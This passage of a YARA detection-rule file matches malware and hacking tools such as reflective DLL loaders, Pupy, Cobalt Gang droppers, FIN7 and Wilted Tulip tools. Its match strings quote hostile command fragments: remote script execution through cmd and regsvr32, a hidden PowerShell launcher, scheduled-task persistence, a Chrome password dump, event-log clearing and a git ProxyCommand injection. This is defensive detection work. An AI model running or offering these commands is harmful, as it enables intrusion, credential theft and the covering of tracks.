      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SCRIPT, T1064, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "cmd /C script:http://" ascii nocase
      $s2 = "cmd /C script:https://" ascii nocase
      $s3 = "cmd.exe /C script:http://" ascii nocase
      $s4 = "cmd.exe /C script:https://" ascii nocase
   condition: 
      1 of them
} 

rule Reflective_DLL_Loader_Aug17_1_RID317F : DEMO EXE FILE HKTL T1055 T1136 {
   meta:
      description = "Detects Reflective DLL Loader"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-08-20 13:25:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1055, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "\\Release\\reflective_dll.pdb" ascii
      $x2 = "reflective_dll.x64.dll" fullword ascii
      $s3 = "DLL Injection" fullword ascii
      $s4 = "?ReflectiveLoader@@YA_KPEAX@Z" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == "4bf489ae7d1e6575f5bb81ae4d10862f" or pe.exports ( "?ReflectiveLoader@@YA_KPEAX@Z" ) or ( 1 of ( $x* ) or 2 of them ) ) ) or ( 2 of them )
} 

rule DLL_Injector_Lynx_RID2D94 : DEMO EXE FILE HKTL T1055 T1136 {
   meta:
      description = "Detects Lynx DLL Injector"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-08-20 10:37:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1055, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = " -p <TARGET PROCESS NAME> | -u <DLL PAYLOAD> [--obfuscate]" fullword wide
      $x2 = "You've selected to inject into process: %s" fullword wide
      $x3 = "Lynx DLL Injector" fullword wide
      $x4 = "Reflective DLL Injector" fullword wide
      $x5 = "Failed write payload: %lu" fullword wide
      $x6 = "Failed to start payload: %lu" fullword wide
      $x7 = "Injecting payload..." fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 800KB and 1 of them ) or ( 3 of them )
} 

rule Reflective_DLL_Loader_Aug17_2_RID3180 : DEMO EXE FILE HKTL T1055 T1136 {
   meta:
      description = "Detects Reflective DLL Loader - suspicious - Possible FP could be program crack"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-08-20 13:25:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1055, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "\\ReflectiveDLLInjection-master\\" ascii
      $s2 = "reflective_dll.dll" fullword ascii
      $s3 = "DLL injection" fullword ascii
      $s4 = "_ReflectiveLoader@4" fullword ascii
      $s5 = "Reflective Dll Injection" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.imphash ( ) == "59867122bcc8c959ad307ac2dd08af79" or pe.exports ( "_ReflectiveLoader@4" ) or 2 of them ) ) or ( 3 of them )
} 

rule Reflective_DLL_Loader_Aug17_3_RID3181 : DEMO EXE FILE HKTL T1055 T1136 {
   meta:
      description = "Detects Reflective DLL Loader"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-08-20 13:25:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1055, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "\\Release\\inject.pdb" fullword ascii
      $s2 = "!!! Failed to gather information on system processes! " fullword ascii
      $s3 = "reflective_dll.dll" fullword ascii
      $s4 = "[-] %s. Error=%d" fullword ascii
      $s5 = "\\Start Menu\\Programs\\reflective_dll.dll" ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == "26ba48d3e3b964f75ff148b6679b42ec" or 2 of them ) ) or ( 3 of them )
} 

rule Reflective_DLL_Loader_Aug17_4_RID3182 : DEMO EXE FILE HKTL T1055 T1136 {
   meta:
      description = "Detects Reflective DLL Loader"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-08-20 13:25:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1055, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "<H1>&nbsp;>> >> >> Keylogger Installed - %s %s << << <<</H1>" fullword ascii
      $s1 = "<H3> ----- Running Process ----- </H3>" fullword ascii
      $s2 = "<H2>Operating system: %s<H2>" fullword ascii
      $s3 = "<H2>System32 dir:  %s</H2>" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 2 of them )
} 

rule ShadowPad_nssock2_RID2DAE : DEMO EXE FILE MAL {
   meta:
      description = "Detects malicious nssock2.dll from ShadowPad incident - file nssock2.dll"
      author = "Florian Roth"
      reference = "https://securelist.com/shadowpad-in-corporate-networks/81432/"
      date = "2017-08-15 10:42:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( pe.imphash ( ) == "c67de089f2009b21715744762fc484e8" or pe.imphash ( ) == "11522f7d4b2fc05acba8f534ca1b828a" ) )
} 

rule Pupy_Backdoor_RID2C43 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Pupy backdoor"
      author = "Florian Roth"
      reference = "https://github.com/n1nj4sec/pupy-binaries"
      date = "2017-08-11 09:41:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "reflectively inject a dll into a process." fullword ascii
      $x2 = "ld_preload_inject_dll(cmdline, dll_buffer, hook_exit) -> pid" fullword ascii
      $x3 = "LD_PRELOAD=%s HOOK_EXIT=%d CLEANUP=%d exec %s 1>/dev/null 2>/dev/null" fullword ascii
      $x4 = "reflective_inject_dll" fullword ascii
      $x5 = "ld_preload_inject_dll" fullword ascii
      $x6 = "get_pupy_config() -> string" fullword ascii
      $x7 = "[INJECT] inject_dll. OpenProcess failed." fullword ascii
      $x8 = "reflective_inject_dll" fullword ascii
      $x9 = "reflective_inject_dll(pid, dll_buffer, isRemoteProcess64bits)" fullword ascii
      $x10 = "linux_inject_main" fullword ascii
   condition: 
      ( ( uint16 ( 0 ) == 0x457f or uint16 ( 0 ) == 0x5a4d ) and filesize < 7000KB and 1 of them ) or 3 of them or ( uint16 ( 0 ) == 0x5a4d and pe.imphash ( ) == "84a69bce2ff6d9f866b7ae63bd70b163" )
} 

rule git_CVE_2017_9800_poc_RID2D8C : DEMO EXPLOIT SUSP T1136 {
   meta:
      description = "Detects a CVE-2017-9800 exploitation attempt"
      author = "Florian Roth"
      reference = "https://twitter.com/mzbat/status/895811803325898753"
      date = "2017-08-11 10:36:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXPLOIT, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "git clone ssh://-oProxyCommand=" ascii
      $s2 = "git clone http://-" ascii
      $s3 = "git clone https://-" ascii
   condition: 
      filesize < 200KB and 1 of them
} 

rule CobaltStrike_CN_Group_BeaconDropper_Aug17_RID369B : CHINA DEMO MAL S0154 T1075 T1117 T1136 {
   meta:
      description = "Detects Script Dropper of Cobalt Gang used in August 2017"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-08-09 17:03:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, MAL, S0154, T1075, T1117, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "WriteLine(\"(new ActiveXObject('WScript.Shell')).Run('cmd /c c:/" ascii
      $x2 = "WriteLine(\" (new ActiveXObject('WScript.Shell')).Run('regsvr32 /s" ascii
      $x3 = "sh.Run(env('cmd /c set > %temp%" ascii
      $x4 = "sh.Run('regsvr32 /s /u /i:" ascii
      $x5 = ".Get('Win32_ScheduledJob').Create('regsvr32 /s /u /i:" ascii
      $x6 = "scrobj.dll','********" ascii
      $x7 = "www.thyssenkrupp-marinesystems.org" fullword ascii
      $x8 = "f.WriteLine(\" tLnk=env('%tmp%/'+lnkName+'.lnk');\");" fullword ascii
      $x9 = "lnkName='office 365'; " fullword ascii
      $x10 = ";sh=x('WScript.Shell');" ascii
   condition: 
      ( filesize < 200KB and 1 of them )
} 

rule CobaltGang_Malware_Aug17_1_RID307F : DEMO EXE FILE G0080 MAL T1136 {
   meta:
      description = "Detects a Cobalt Gang malware"
      author = "Florian Roth"
      reference = "https://sslbl.abuse.ch/intel/6ece5ece4192683d2d84e25b0ba7e04f9cb7eb7c"
      date = "2017-08-09 12:42:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0080, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ServerSocket.EXE" fullword wide
      $s2 = "Incorrect version of WS2_32.dll found" fullword ascii
      $s3 = "Click 'Connect' to Connect to the Server.  'Disconnect' to disconnect from server." fullword wide
      $s4 = "Click 'Start' to start the Server.  'Stop' to Stop it." fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 3 of them )
} 

rule CobaltGang_Malware_Aug17_2_RID3080 : DEMO EXE FILE G0080 MAL T1136 {
   meta:
      description = "Detects a Cobalt Gang malware"
      author = "Florian Roth"
      reference = "https://sslbl.abuse.ch/intel/6ece5ece4192683d2d84e25b0ba7e04f9cb7eb7c"
      date = "2017-08-09 12:42:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0080, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; BOIE9;ENGB)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )
} 

rule Agent_BTZ_Proxy_DLL_1_RID2E9B : DEMO EXE FILE HKTL MAL T1090 T1136 {
   meta:
      description = "Detects Agent-BTZ Proxy DLL - activeds.dll"
      author = "Florian Roth"
      reference = "http://www.intezer.com/new-variants-of-agent-btz-comrat-found/"
      date = "2017-08-07 11:21:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, MAL, T1090, T1136"
      required_modules = "pe"
      minimum_yara = "3.0.0"
      
   strings:
      $s1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Modules" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them and pe.exports ( "Entry" ) )
} 

rule Agent_BTZ_Aug17_RID2C33 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Agent.BTZ"
      author = "Florian Roth"
      reference = "http://www.intezer.com/new-variants-of-agent-btz-comrat-found/"
      date = "2017-08-07 09:39:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.0.0"
      
   strings:
      $s1 = "stdole2.tlb" fullword ascii
      $s2 = "UnInstallW" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and all of them and pe.exports ( "Entry" ) and pe.exports ( "InstallW" ) and pe.exports ( "UnInstallW" ) )
} 

rule Zeus_Panda_RID2AFB : CHINA DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects ZEUS Panda Malware"
      author = "Florian Roth"
      reference = "https://cyberwtf.files.wordpress.com/2017/07/panda-whitepaper.pdf"
      date = "2017-08-04 08:47:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "SER32.dll" fullword ascii
      $x2 = "/c start \"\" \"%s\"" fullword wide
      $x3 = "del /F \"%s\"" fullword ascii
      $s1 = "bcdfghklmnpqrstvwxz" fullword ascii
      $s2 = "=> -,0;" fullword ascii
      $s3 = "Yahoo! Slurp" fullword ascii
      $s4 = "ZTNHGET ^&" fullword ascii
      $s5 = "MSIE 9" fullword ascii
      $s6 = "%s%08x.%s" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 2 of ( $x* ) or 4 of them )
} 

rule FIN7_Dropper_Aug17_RID2D44 : DEMO FILE G0046 MAL RUSSIA T1136 {
   meta:
      description = "Detects Word Dropper from Proofpoint FIN7 Report"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor"
      date = "2017-08-04 10:24:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, G0046, MAL, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "tpircsj:e/ b// exe.tpircsw\" rt/" fullword ascii
      $s1 = "Scripting.FileSystemObject$" fullword ascii
      $s2 = "PROJECT.THISDOCUMENT.AUTOOPEN" fullword wide
      $s3 = "Project.ThisDocument.AutoOpen" fullword wide
      $s4 = "\\system3" fullword ascii
      $s5 = "ShellV" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0xcfd0 and filesize < 700KB and 1 of ( $x* ) or all of ( $s* ) )
} 

rule FIN7_Backdoor_Aug17_RID2D8D : DEMO EXE FILE G0046 MAL RUSSIA T1053 T1136 {
   meta:
      description = "Detects Word Dropper from Proofpoint FIN7 Report"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor"
      date = "2017-08-04 10:36:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0046, MAL, RUSSIA, T1053, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "wscript.exe //b /e:jscript C:\\Users\\" ascii
      $x2 = "wscript.exe /b /e:jscript C:\\Users\\" ascii
      $x3 = "schtasks /Create /f /tn \"GoogleUpdateTaskMachineSystem\" /tr \"wscript.exe" ascii nocase
      $x4 = "schtasks /Delete /F /TN \"\"GoogleUpdateTaskMachineCore" ascii nocase
      $x5 = "schtasks /Delete /F /TN \"GoogleUpdateTaskMachineCore" ascii nocase
      $x6 = "wscript.exe //b /e:jscript %TMP%\\debug.txt" ascii
      $s1 = "/?page=wait" fullword ascii
      $a1 = "autoit3.exe" fullword ascii
      $a2 = "dumpcap.exe" fullword ascii
      $a3 = "tshark.exe" fullword ascii
      $a4 = "prl_cc.exe" fullword ascii
      $v1 = "vmware" fullword ascii
      $v2 = "PCI\\\\VEN_80EE&DEV_CAFE" fullword ascii
      $v3 = "VMWVMCIHOSTDEV" fullword ascii
      $c1 = "apowershell" fullword ascii
      $c2 = "wpowershell" fullword ascii
      $c3 = "get_passwords" fullword ascii
      $c4 = "kill_process" fullword ascii
      $c5 = "get_screen" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and ( 1 of ( $x* ) or all of ( $a* ) or all of ( $v* ) or 3 of ( $c* ) ) ) or 5 of them
} 

rule Impacket_Keyword_RID2D83 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Detects Impacket Keyword in Executable"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-08-04 10:35:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "impacket.smb(" fullword ascii
      $s2 = "impacket.ntlm(" fullword ascii
      $s3 = "impacket.nmb(" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 14000KB and 1 of them )
} 

rule PowerShdll_RID2B15 : DEMO HKTL T1085 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - from files PowerShdll_RID2B15.dll, PowerShdll_RID2B15.dll"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-08-03 08:51:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "rundll32 PowerShdll_RID2B15,main -f <path>" fullword wide
      $x2 = "\\PowerShdll_RID2B15.dll" fullword ascii
      $x3 = "rundll32 PowerShdll_RID2B15,main <script>" fullword wide
   condition: 
      1 of them
} 

rule Foudre_Backdoor_1_RID2D8A : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Foudre Backdoor"
      author = "Florian Roth"
      reference = "https://goo.gl/Nbqbt6"
      date = "2017-08-01 10:36:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "initialization failed: Reinstall the program" fullword wide
      $s2 = "SnailDriver V1" fullword wide
      $s3 = "lp.ini" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 2 of them )
} 

rule Foudre_Backdoor_SFX_RID2E4A : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Foudre Backdoor SFX"
      author = "Florian Roth"
      reference = "https://goo.gl/Nbqbt6"
      date = "2017-08-01 11:08:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "main.exe" fullword ascii
      $s2 = "pub.key" fullword ascii
      $s3 = "WinRAR self-extracting archive" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )
} 

rule IsmDoor_Jul17_A2_RID2C92 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects IsmDoor Malware"
      author = "Florian Roth"
      reference = "https://twitter.com/Voulnet/status/892104753295110145"
      date = "2017-08-01 09:54:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "powershell -exec bypass -file \"" fullword ascii
      $s2 = "PAQlFcaWUaFkVICEx2CkNCUUpGcA" ascii
      $s3 = "\\Documents" fullword ascii
      $s4 = "\\Libraries" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 3 of them )
} 

rule Unknown_Malware_Sample_Jul17_2_RID326D : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects unknown malware sample with pastebin RAW URL"
      author = "Florian Roth"
      reference = "https://goo.gl/iqH8CK"
      date = "2017-08-01 14:04:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii
      $s2 = "https://pastebin.com/raw/" wide
      $s3 = "My.Computer" fullword ascii
      $s4 = "MyTemplate" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
} 

rule Foudre_Backdoor_Dropper_1_RID30C5 : DEMO EXE FILE MAL T1060 T1136 {
   meta:
      description = "Detects Foudre Backdoor"
      author = "Florian Roth"
      reference = "https://goo.gl/Nbqbt6"
      date = "2017-08-01 12:54:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1060, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "536F594A96C5496CB3949A4DA4775B576E049C57696E646F77735C43757272656E7456657273696F6E5C5C52756E" fullword wide
      $x2 = "2220263024C380B3278695851482EC32" fullword wide
      $s1 = "C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\\\Startup\\" fullword wide
      $s2 = "C:\\Documents and Settings\\All Users\\" fullword wide
      $s3 = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\\\Shell Folders" fullword wide
      $s4 = "ShellExecuteW" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) or 4 of them ) )
} 

rule Foudre_Backdoor_Component_1_RID319C : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Foudre Backdoor"
      author = "Florian Roth"
      reference = "https://goo.gl/Nbqbt6"
      date = "2017-08-01 13:29:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.0.0"
      
   strings:
      $s1 = { 50 72 6F 6A 65 63 74 31 2E 64 6C 6C 00 44 31 } 
      $s2 = "winmgmts:\\\\localhost\\root\\SecurityCenter2" fullword wide
      $s3 = "C:\\Documents and Settings\\All Users\\" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 3 of them ) or ( 2 of them and pe.exports ( "D1" ) ) )
} 

rule CACTUSTORCH_RID2A54 : DEMO HKTL T1085 T1136 {
   meta:
      description = "Detects CactusTorch Hacktool"
      author = "Florian Roth"
      reference = "https://github.com/mdsecactivebreach/CACTUSTORCH_RID2A54"
      date = "2017-07-31 05:11:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "$payload = shellcode(%options[\"listener\"], \"true\", \"x86\");" fullword ascii
      $x2 = "Copy the base64 encoded payload into the code variable below." fullword ascii
      $x3 = " CACTUSTORCH_RID2A54 Payload" ascii
      $x4 = "ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length), 0, ((length / 4) * 3)" fullword ascii
      $x5 = "' Author: Vincent Yiu (@vysecurity)" fullword ascii
      $x6 = "Dim binary : binary = \"rundll32.exe\"" fullword ascii
      $a1 = "code = code & \"" ascii
      $a2 = "serialized_obj = serialized_obj & \"" ascii
      $s1 = "binary = \"rundll32.exe\"" fullword ascii
      $s2 = "EL.DataType = \"bin.hex\"" fullword ascii
      $s3 = "Set stm = CreateObject(\"System.IO.MemoryStream\")" fullword ascii
      $s4 = "var binary = \"rundll32.exe\";" fullword ascii
      $s5 = "var serialized_obj = \"" ascii
   condition: 
      ( filesize < 800KB and ( 1 of ( $x* ) or ( 1 of ( $a* ) and 1 of ( $s* ) ) ) ) or ( 3 of them )
} 

rule SUSP_MyWScript_RID2C4D : DEMO EXE FILE MAL SUSP T1136 {
   meta:
      description = "Detects files generated with Script2Exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-07-27 09:43:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "C:\\Projets\\vbsedit_source\\script2exe\\Release\\mywscript.pdb" fullword ascii
      $s1 = "mywscript2" fullword wide
      $s2 = "MYWSCRIPT2" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and ( $x1 or 2 of them )
} 

rule AllTheThings_RID2BB8 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Detects AllTheThings_RID2BB8"
      author = "Florian Roth"
      reference = "https://github.com/subTee/AllTheThings_RID2BB8"
      date = "2017-07-27 09:18:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\obj\\Debug\\AllTheThings_RID2BB8.pdb" fullword ascii
      $x2 = "AllTheThings_RID2BB8.exe" fullword wide
      $x3 = "\\AllTheThings_RID2BB8.dll" fullword ascii
      $x4 = "Hello From Main...I Don't Do Anything" fullword wide
      $x5 = "I am a basic COM Object" fullword wide
      $x6 = "I shouldn't really execute either." fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and 1 of them )
} 

rule PowerShell_Emp_Eval_Jul17_A1_RID3141 : DEMO EXE FILE HKTL SCRIPT T1086 T1136 {
   meta:
      description = "Detects suspicious sample with PowerShell content "
      author = "Florian Roth"
      reference = "PowerShell Empire Eval"
      date = "2017-07-27 13:14:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, SCRIPT, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "powershell" wide
      $s2 = "pshcmd" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them )
} 

rule PowerShell_Emp_Eval_Jul17_A2_RID3142 : DEMO EXE FILE HKTL SCRIPT T1086 T1136 {
   meta:
      description = "Detects suspicious sample with PowerShell content "
      author = "Florian Roth"
      reference = "PowerShell Empire Eval"
      date = "2017-07-27 13:14:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, SCRIPT, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\support\\Release\\ab.pdb" ascii
      $s2 = "powershell.exe" ascii fullword
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
} 

rule WiltedTulip_powershell_RID302C : APT DEMO T1086 T1136 {
   meta:
      description = "Detects powershell script used in Operation Wilted Tulip"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23 12:28:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "powershell.exe -nop -w hidden -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+" ascii
   condition: 
      1 of them
} 

rule WiltedTulip_Tools_back_RID2FE8 : APT DEMO EXE FILE T1003 T1136 {
   meta:
      description = "Detects Chrome password dumper used in Operation Wilted Tulip"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23 12:17:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1003, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "%s.exe -f \"C:\\Users\\Admin\\Google\\Chrome\\TestProfile\" -o \"c:\\passlist.txt\"" fullword ascii
      $x2 = "\\ChromePasswordDump\\Release\\FireMaster.pdb" fullword ascii
      $x3 = "//Dump Chrome Passwords to a Output file \"c:\\passlist.txt\"" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them )
} 

rule WiltedTulip_Tools_clrlg_RID306B : APT DEMO T1136 {
   meta:
      description = "Detects Windows eventlog cleaner used in Operation Wilted Tulip - file clrlg.bat"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23 12:39:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "('wevtutil.exe el') DO (call :do_clear" fullword ascii
      $s2 = "wevtutil.exe cl %1" fullword ascii
   condition: 
      filesize < 1KB and 1 of them
} 

rule WiltedTulip_vminst_RID2E88 : APT DEMO EXE FILE T1085 T1136 {
   meta:
      description = "Detects malware used in Operation Wilted Tulip"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23 11:18:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\C++\\Trojan\\Target\\" ascii
      $s1 = "%s\\system32\\rundll32.exe" fullword wide
      $s2 = "$C:\\Windows\\temp\\l.tmp" fullword wide
      $s3 = "%s\\svchost.exe" fullword wide
      $s4 = "args[10] is %S and command is %S" fullword ascii
      $s5 = "LOGON USER FAILD " fullword ascii
      $s6 = "vminst.tmp" fullword wide
      $s7 = "operator co_await" fullword ascii
